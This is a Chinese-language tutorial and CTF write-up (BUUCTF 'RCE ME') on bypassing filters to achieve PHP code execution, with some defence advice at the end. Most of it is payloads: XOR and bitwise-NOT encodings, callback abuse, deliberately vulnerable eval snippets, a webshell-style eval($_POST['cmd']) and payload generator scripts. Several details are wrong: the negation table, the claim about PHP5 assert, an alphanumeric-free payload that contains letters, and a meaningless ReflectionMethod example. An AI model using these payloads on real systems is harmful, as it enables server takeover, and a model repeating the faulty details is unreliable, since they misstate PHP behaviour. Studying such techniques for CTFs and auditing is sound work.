# PHP代码执行过滤绕过详解

## 1. 引言

在Web安全领域，**PHP代码执行**是一种常见且危险的安全漏洞。当应用程序将用户输入传递给危险函数如`eval()`、`assert()`等，且未进行充分的过滤和消毒时，攻击者可能执行任意PHP代码，从而完全控制服务器。

### PHP代码执行函数简介

PHP提供了多个能够执行代码的函数，这些函数通常被称为"代码执行函数"或"动态代码执行函数"。常见的有：

- `eval()` - 将字符串作为PHP代码执行
- `assert()` - 检查断言是否为false，如果传入字符串则执行
- `preg_replace()` with `/e`修饰符 - 执行正则替换后的代码
- `create_function()` - 创建匿名函数
- `call_user_func()` - 调用回调函数
- `system()`、`exec()`、`shell_exec()` - 执行系统命令

### 过滤场景的常见场景

在CTF比赛和实际渗透测试中，我们经常遇到以下过滤场景：

1. **关键字过滤**：过滤掉敏感函数名如`system`、`exec`、`eval`等
2. **字母数字过滤**：禁止使用字母和数字字符
3. **长度限制**：限制输入长度，防止完整payload输入
4. **正则匹配**：使用正则表达式限制可输入的字符范围

理解这些过滤机制的绕过方法，对于安全测试和代码审计至关重要。

## 2. 代码执行函数分类

### eval()

`eval()`是PHP中最常用的代码执行函数，它将传入的字符串作为PHP代码来执行。

```php
<?php
$code = 'echo "Hello World";';
eval($code); // 输出: Hello World
?>
```

**注意事项**：
- `eval()`的参数必须是一个完整的PHP语句，以分号结尾
- `eval()`不能使用`<?php ?>`标签
- `eval()`在PHP7.0.0之前的版本中，被包裹在`assert()`中的字符串会以相同的权限执行

### assert()

`assert()`函数在PHP5和PHP7中有显著的行为差异。在PHP5中，`assert()`是一个断言函数；在PHP7中，如果传入字符串，它会将字符串作为PHP代码执行。

```php
<?php
// PHP7+
assert('system("whoami")'); // 执行系统命令
?>
```

**版本差异**：
- **PHP5.x**：assert()是断言函数，字符串不会执行
- **PHP7.0.0+**：assert()可以将字符串作为PHP代码执行
- **PHP7.2.0+**：`assert()`默认不再接受字符串作为第一个参数（可通过配置启用）

### preg_replace() with /e修饰符

`preg_replace()`函数使用正则表达式进行搜索和替换。当使用`/e`修饰符时，替换字符串会被作为PHP代码执行。

```php
<?php
$code = $_GET['code'];
preg_replace("/pattern/e", $code, "string");
?>
```

**重要提示**：此功能在**PHP 5.5.0**中被弃用，在**PHP 7.0.0**中被移除。

```php
<?php
// 此代码在PHP7中已不可用
preg_replace("/.*/e", $_GET['code'], "");
?>
```

### create_function()

`create_function()`创建一个匿名函数（lambda风格），在内部会使用`eval()`执行代码。

```php
<?php
$func = create_function('$a', 'return system($a);');
$func("whoami"); // 执行命令
?>
```

**版本信息**：此函数在**PHP 7.2.0**中被弃用，在**PHP 8.0.0**中被移除。

## 3. 可回调函数

PHP提供了多个接受回调函数作为参数的函数，合理利用这些函数可以绕过某些过滤机制。

### array_map()

为数组的每个元素应用回调函数。

```php
<?php
$func = $_GET['func'];
$arr = [$_GET['cmd']];
array_map($func, $arr);
?>
```

**Payload示例**：
```php
?func=system&cmd=whoami
```

### call_user_func()

调用回调函数，第一个参数是回调函数名，后续参数作为回调函数的参数。

```php
<?php
call_user_func($_GET['func'], $_GET['cmd']);
?>
```

**Payload示例**：
```php
?func=system&cmd=whoami
```

### call_user_func_array()

与`call_user_func()`类似，但参数以数组形式传递。

```php
<?php
call_user_func_array($_GET['func'], [$_GET['cmd']]);
?>
```

### array_filter()

使用回调函数过滤数组的每个元素。

```php
<?php
$arr = [$_GET['cmd']];
array_filter($arr, $_GET['func']);
?>
```

### usort()

使用用户自定义的比较函数对数组排序。

```php
<?php
usort($_GET['arr'], $_GET['func']);
?>
```

由于PHP的特性，第二个参数（回调函数）可以是字符串形式的函数名，甚至是包含代码的字符串：

```php
?arr[0]=1&arr[1]=system("whoami")&func=assert
```

## 4. 绕过技术详解

### 4.1 字符串拼接绕过

**原理说明**：当过滤机制仅拦截特定关键字时，可以通过字符串拼接来构造被过滤的函数名。PHP的字符串拼接使用`.`运算符。

**PHP版本适用性**：适用于**PHP 5.x**及**PHP 7.x**所有版本。

**Payload示例**：

```php
// 执行 phpinfo()
(p.h.p.i.n.f.o)();

// 执行 system("whoami")
(sy.(st).em)("whoami");

// 拼接更复杂的命令
(sy.(st).em)(who.ami);
(s.y.s.t.e.m)("whoami");
```

**实际案例**：

```php
<?php
if(isset($_GET['code'])){
    $code = $_GET['code'];
    if(preg_match("/system|exec|shell_exec/", $code)){
        die("Hacked!");
    }
    eval($code);
}
?>
```

绕过：
```php
?code=(sys.(tem))("whoami");
```

### 4.2 字符串转义绕过

**原理说明**：PHP支持多种字符转义表示法，包括八进制和十六进制转义。这些转义序列在双引号字符串中会被解析为对应的字符，从而可以绕过关键字过滤。

**PHP版本适用性**：适用于**PHP 5.x**及**PHP 7.x**所有版本。

**转义类型**：
- **八进制转义**：`\0-7{1,3}` - 匹配八进制值的字符
- **十六进制转义**：`\x[0-9A-Fa-f]{1,2}` - 匹配十六进制值的字符
- **Unicode转义**：`\u{[0-9A-Fa-f]+}` - Unicode码点（PHP 7.0+）

**重要提示**：转义字符**必须用双引号包裹**，单引号字符串不会解析转义序列。

**Payload示例**：

```php
// 构造 system
"\x73\x79\x73\x74\x65\x6d"

// 构造 whoami
"\x77\x68\x6f\x61\x6d\x69"

// 完整利用
"\x73\x79\x73\x74\x65\x6d"("whoami")

// Unicode转义 (PHP 7.0+)
"\u{73}\u{79}\u{73}\u{74}\u{65}\u{6d}"
```

**实际案例**：

```php
<?php
$func = $_GET['func'];
$$func = $_GET['var'];
?>
```

绕过：
```php
?func=\x73\x79\x73\x74\x65\x6d&var=whoami
```

### 4.3 多次传参绕过

**原理说明**：PHP的参数传递具有变长特性，可以利用这一特性在有限的字符集下构造复杂的payload。通过多次请求或URL参数拼接，可以实现更复杂的攻击。

**PHP版本适用性**：适用于**PHP 5.x**及**PHP 7.x**所有版本。

**Payload示例**：

```php
// 第一次请求：定义函数
?code=$_GET['func'];

// 第二次请求：执行命令
&func=system&cmd=whoami

// 或者利用PHP的变量覆盖特性
?code=$_=func;$_($cmd);
```

**进阶利用**：

```php
<?php
// 利用extract()进行变量覆盖
extract($_GET);
eval($code);
?>
```

### 4.4 内置函数访问绕过

**原理说明**：某些情况下，敏感函数被过滤，但我们可以利用PHP的反射机制或内置类的方法来间接调用。常用的类包括`ReflectionMethod`、`Closure`、`SplFileObject`等。

**PHP版本适用性**：适用于**PHP 5.x**及**PHP 7.x**所有版本。

**Payload示例**：

```php
// 利用ReflectionMethod调用system
(new ReflectionMethod('Math','randomGen'))->invoke(null,'whoami');

// 利用Closure
$func = function($cmd){ system($cmd); };
$func("whoami");
```

### 4.5 异或绕过

**原理说明**：当过滤了所有`[A-Za-z0-9]`字符时，可以利用非字母数字字符进行异或运算来构造目标字符。在ASCII表中，字母和数字的取值范围是65-122，通过对某些特殊字符进行异或运算可以得到这些值。

**数学原理**：
- 如果 `A ^ B = C`，那么 `A ^ C = B` 且 `B ^ C = A`
- 例如：`'?' ^ '~' = 63 ^ 126 = 65 = 'A'`

**PHP版本适用性**：适用于**PHP 5.x**及**PHP 7.x**所有版本。

**字符范围**：
用于异或的特殊字符通常包括：
```
0-9: 数字字符
!: #, $, %, &, *, +, -, ., /, :, ;, <, =, >, ?, @, [, \, ], ^, _, `, {, |, }, ~
```

**生成脚本**（Python）：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

def generate_xor_payload(target):
    """生成异或payload"""
    chars = [chr(i) for i in range(33, 127)]  # 可打印字符
    chars.remove('"')
    chars.remove("'")
    chars.remove('\\')
    
    result = {}
    for c in target:
        for a in chars:
            for b in chars:
                if ord(a) ^ ord(b) == ord(c):
                    result[c] = (a, b)
                    break
            if c in result:
                break
    return result

def build_payload(target):
    """构建完整的payload"""
    payload_parts = []
    expr_parts = []
    
    for i, c in enumerate(target):
        if i < len(target) - 1:
            payload_parts.append(f"'{'\\x{:02x}'.format(ord(c))}'")
        else:
            expr_parts.append(f"'{'\\x{:02x}'.format(ord(c))}'")
    
    return '.'.join(payload_parts), '.'.join(expr_parts)

# 示例：生成 assert 的异或payload
payload = generate_xor_payload("assert")
print("异或组合:")
for char, (a, b) in payload.items():
    print(f"  '{char}': '{a}' ^ '{b}' = {ord(char)}")
```

**实战Payload示例**：

```php
// 构造 assert
$_=('%01'^'%60').('%08'^'%7b').('%08'^'%7b').('%05'^'%60').('%09'^'%7b').('%08'^'%7c');

// 完整利用
$__='_'.('%0b'^'%5b').('%0f'^'%40').('%08'^'%5b').('%09'^'%5d');
$___=$$__;
$___[N]($___[_]);
```

### 4.6 URL编码取反绕过

**原理说明**：利用PHP中的按位取反运算符`~`对字符进行取反操作，配合URL编码可以绕过各种过滤。由于取反后的字符是不可见字符，使用URL编码来传输。

**数学原理**：
- `~x = -(x+1)`
- `~~x = x`
- 如果 `~x = y`，那么 `~y = x`

**PHP版本适用性**：适用于**PHP 5.x**及**PHP 7.x**所有版本。

**Payload示例**：

```php
// phpinfo() 的取反结果
~%9E%8C%8C%9A%8D%8B

// 完整利用（assert执行phpinfo）
(~%9E%8C%8C%9A%8D%8B)();
```

**取反计算过程**：

```
p → ~p = 0x9E
h → ~h = 0x8C
p → ~p = 0x8C
i → ~i = 0x9A
n → ~n = 0x8D
f → ~f = 0x8B
o → ~o = (空)
```

**自动化生成脚本**：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

def negate_payload(s):
    """生成取反payload"""
    result = []
    for c in s:
        result.append('%{:02X}'.format(0xFF & ~ord(c)))
    return ''.join(result)

# 测试
print("phpinfo() 的取反结果:", negate_payload('phpinfo'))
print("system() 的取反结果:", negate_payload('system'))
print("whoami 的取反结果:", negate_payload('whoami'))
```

## 5. 实战案例 - BUUCTF [极客大挑战 2019]RCE ME

### 题目分析

```php
<?php
error_reporting(0);
if(isset($_GET['code'])){
    $code=$_GET['code'];
    if(strlen($code)>40){
        die("This is too Long.");
    }
    if(preg_match("/[A-Za-z0-9]+/",$code)){
        die("NO.");
    }
    @eval($code);
}else{
    highlight_file(__FILE__);
}
?>
```

**过滤条件分析**：
1. 长度限制：payload不能超过40字符
2. **关键过滤**：`preg_match("/[A-Za-z0-9]+/",$code)` - 禁止所有字母和数字

**绕过思路**：
由于禁止使用所有字母和数字，我们需要使用非字母数字字符来构造payload。常用的方法有：
1. **URL编码取反绕过**
2. **异或绕过**

### 绕过方法1 - URL编码取反

利用取反运算符`~`配合URL编码绕过字母数字过滤。

**构造过程**：

```
目标函数：assert
目标命令：eval($_POST['cmd'])

assert(~%9E%8C%8C%9A%8D%8B)  // assert的取反
eval(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6)  // $_POST['cmd']的取反
```

**Payload**：

```php
?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6);
```

**验证**：

```bash
# POST发送
cmd=system('whoami');
```

### 绕过方法2 - 异或绕过

利用特殊字符的异或运算构造字母数字字符。

**构造过程**：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# 目标：构造 $_GET[_]($_GET[__]); 这种形式的短payload

# 可打印字符异或表
chars = []
for i in range(32, 128):
    chars.append(chr(i))

def find_xor_pair(target):
    """找到能异或得到目标字符的两个字符"""
    for a in chars:
        for b in chars:
            if ord(a) ^ ord(b) == ord(target):
                return a, b
    return None, None

# 测试
print("构造 _GET:")
for c in "_GET":
    a, b = find_xor_pair(c)
    print(f"  '{c}': '{a}' ^ '{b}' = {ord(c)}")
```

**短Payload（推荐）**：

```php
?code=$_GET[_]($_GET[__]);&_=assert&__=eval($_POST['cmd']);
```

**Payload长度**：约39字符，符合40字符限制。

### 完整解题步骤

1. **访问题目**，发现源码如上
2. **分析过滤**：禁止字母数字，长度限制40字符
3. **构造Payload**：使用取反或异或绕过
4. **发送请求**：

```bash
# 使用取反绕过
GET /?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6); HTTP/1.1
Host: target

# 使用异或绕过
GET /?code=$_GET[_]($_GET[__]);&_=assert&__=eval($_POST['cmd']); HTTP/1.1
Host: target

POST / HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

cmd=system('ls /');
```

5. **获取Flag**：执行命令读取flag文件

## 6. 总结与防御建议

### 绕过技术总结

| 绕过方法 | 适用场景 | PHP版本 | 复杂度 |
|---------|---------|---------|--------|
| 字符串拼接 | 过滤特定关键字 | 5.x-7.x | 低 |
| 字符串转义 | 过滤特定关键字 | 5.x-7.x | 低 |
| 多次传参 | 变量覆盖场景 | 5.x-7.x | 中 |
| 内置函数访问 | 反射类可用 | 5.x-7.x | 高 |
| 异或绕过 | 过滤所有字母数字 | 5.x-7.x | 高 |
| URL编码取反 | 过滤所有字母数字 | 5.x-7.x | 中 |

### 防御建议

1. **输入过滤与验证**
   - 对用户输入进行严格的类型检查和格式验证
   - 使用白名单机制而非黑名单机制
   - 避免直接使用用户输入执行代码

2. **正确使用安全函数**
   - 使用`escapeshellarg()`和`escapeshellcmd()`处理系统命令
   - 使用参数化查询防止SQL注入
   - 使用`htmlspecialchars()`处理HTML输出

3. **配置安全设置**
   - 禁用危险函数：`disable_functions = exec,system,shell_exec,passthru,proc_open,popen`
   - 开启安全模式：`safe_mode = On`
   - 限制文件访问：`open_basedir = /var/www/html`

4. **代码审计重点**
   - 检查所有使用`eval()`、`assert()`、`preg_replace()`的代码
   - 审查动态函数调用：`call_user_func()`、`array_map()`
   - 关注字符串拼接构造的可执行代码

5. **日志与监控**
   - 记录所有用户输入，特别是包含特殊字符的输入
   - 监控异常的系统命令执行行为
   - 定期进行代码审计和渗透测试

### 参考资料

- [PHP官方文档 - eval()](https://www.php.net/manual/zh/function.eval.php)
- [PHP官方文档 - assert()](https://www.php.net/manual/zh/function.assert.php)
- [BUUCTF 极客大挑战 2019 RCE ME Writeup](https://blog.csdn.net/mochu7777777/article/details/104631142)
- [PHP代码执行绕过技术详解](https://blog.csdn.net/2401_88083440/article/details/145761244)
